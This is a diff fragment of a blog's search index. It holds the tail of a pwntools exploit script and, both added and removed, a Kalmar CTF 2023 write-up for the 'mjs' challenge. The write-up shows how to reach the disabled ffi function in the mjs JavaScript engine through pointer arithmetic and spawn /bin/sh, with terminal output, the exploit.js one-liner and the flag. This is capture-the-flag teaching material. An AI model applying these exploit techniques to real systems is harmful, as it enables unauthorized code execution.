+    0x38:[
+        0x00004005e2, # _start if eax&#x3D;1, call main again 
+    ]
+&#125;)+b&#39;\n&#39;
+# filled up data
+for i in range(8):
+    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
+    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)
+    io.sendafter(b&quot;Your key?:\n&quot;,payload)
+# overflow &#x2F;dev&#x2F;urandom
+io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)
+io.recvuntil(b&quot;Your key:\n&quot;)
+lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop&#x3D;True))
+io.close()
+]]></content>
+  </entry>
+  <entry>
+    <title>[Pwn] mjs [Kalmar CTF 2023]</title>
+    <url>/ctf-writeup/2023/kalmar/pwn/mjs/index.html</url>
+    <content><![CDATA[0x0 IntroductionDescription: TDB
+Files: TBD
+0x1 Investigating Repositorylooking at mjs github repo
+I found three vary suspicious function. mkstr and ffi. 
+mkstr allow you make string in any memory address.
+ffi allow you to import C function into js environment. This means we can import system into js environment and call system(&#39;/bin/sh&#39;) to getting a shell.
+
+However, challenge disabled those function. So, if you are trying to call those function, you will find this function is not defined. 
+
+When I&#39;m playing around with this javascript engine. I found following interesting statements. 
+We can operate function pointer using mathematical operation (like C). 
+[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
+17:19:25 $ ./mjsvuln -e "print(print)"
+&lt;foreign_ptr@405920>
+undefined
+[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
+18:25:52 $ ./mjsvuln -e "(0x405920)(1)"
+  at &lt;stdin>:1
+MJS error: calling non-callable
+[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
+18:26:04 $ ./mjsvuln -e "(print+9-9)(print)"
+&lt;foreign_ptr@405920>
+undefined
+
+The binary is compiled with glibc2.34. I&#39;m using Ubuntu20.04, so I need to recompile the binary again. So, some function offset might is different from the original binary.
+I calculated the offset between print and ffi. And try to call ffi again. This time, it succeed with an unknown function pointer.
+
+[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
+18:46:33 $ python -c "print(0x0040cbb0-0x00405920)"
+29328
+[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
+18:46:38 $ ./mjsvuln -e 'let f= (print+29328)("int system(char *)");'
+&lt;???-562949926229504>
+
+Then I can just called /bin/sh and got the shell
+[aynakeya @ LAPTOP-T6NBK8L5]:&#x2F;mnt&#x2F;d&#x2F;workspace&#x2F;kalmarctf&#x2F;mjs_handout
+18:46:40 $ .&#x2F;mjsvuln -e &#39;let f&#x3D; (print+29328)(&quot;int system(char *)&quot;);f(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;
+$ ls
+Dockerfile  README.txt  diff.patch  exploit.js  mjs  mjs_src  mjsvuln  remote.py  source  ynetd
+$
+
+0x2 final exploitoffset is little different in the original binary
+exploit.js
+let f&#x3D; (print+27312)(&quot;int system(char *)&quot;);f(&quot;&#x2F;bin&#x2F;sh&quot;)
+
+0x3 flagkalmar{mjs_brok3ey_565591da7d942fef817c}
 ]]></content>
   </entry>
   <entry>
@@ -16396,57 +16447,6 @@ http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/
 https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html
 https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive
 
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] mjs [Kalmar CTF 2023]</title>
-    <url>/ctf-writeup/2023/kalmar/pwn/mjs/index.html</url>
-    <content><![CDATA[0x0 IntroductionDescription: TDB
-Files: TBD
-0x1 Investigating Repositorylooking at mjs github repo
-I found three vary suspicious function. mkstr and ffi. 
-mkstr allow you make string in any memory address.
-ffi allow you to import C function into js environment. This means we can import system into js environment and call system(&#39;/bin/sh&#39;) to getting a shell.
-
-However, challenge disabled those function. So, if you are trying to call those function, you will find this function is not defined. 
-
-When I&#39;m playing around with this javascript engine. I found following interesting statements. 
-We can operate function pointer using mathematical operation (like C). 
-[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
-17:19:25 $ ./mjsvuln -e "print(print)"
-&lt;foreign_ptr@405920>
-undefined
-[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
-18:25:52 $ ./mjsvuln -e "(0x405920)(1)"
-  at &lt;stdin>:1
-MJS error: calling non-callable
-[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
-18:26:04 $ ./mjsvuln -e "(print+9-9)(print)"
-&lt;foreign_ptr@405920>
-undefined
-
-The binary is compiled with glibc2.34. I&#39;m using Ubuntu20.04, so I need to recompile the binary again. So, some function offset might is different from the original binary.
-I calculated the offset between print and ffi. And try to call ffi again. This time, it succeed with an unknown function pointer.
-
-[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
-18:46:33 $ python -c "print(0x0040cbb0-0x00405920)"
-29328
-[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout
-18:46:38 $ ./mjsvuln -e 'let f= (print+29328)("int system(char *)");'
-&lt;???-562949926229504>
-
-Then I can just called /bin/sh and got the shell
-[aynakeya @ LAPTOP-T6NBK8L5]:&#x2F;mnt&#x2F;d&#x2F;workspace&#x2F;kalmarctf&#x2F;mjs_handout
-18:46:40 $ .&#x2F;mjsvuln -e &#39;let f&#x3D; (print+29328)(&quot;int system(char *)&quot;);f(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;
-$ ls
-Dockerfile  README.txt  diff.patch  exploit.js  mjs  mjs_src  mjsvuln  remote.py  source  ynetd
-$
-
-0x2 final exploitoffset is little different in the original binary
-exploit.js
-let f&#x3D; (print+27312)(&quot;int system(char *)&quot;);f(&quot;&#x2F;bin&#x2F;sh&quot;)
-
-0x3 flagkalmar{mjs_brok3ey_565591da7d942fef817c}
 ]]></content>
   </entry>
 </search>
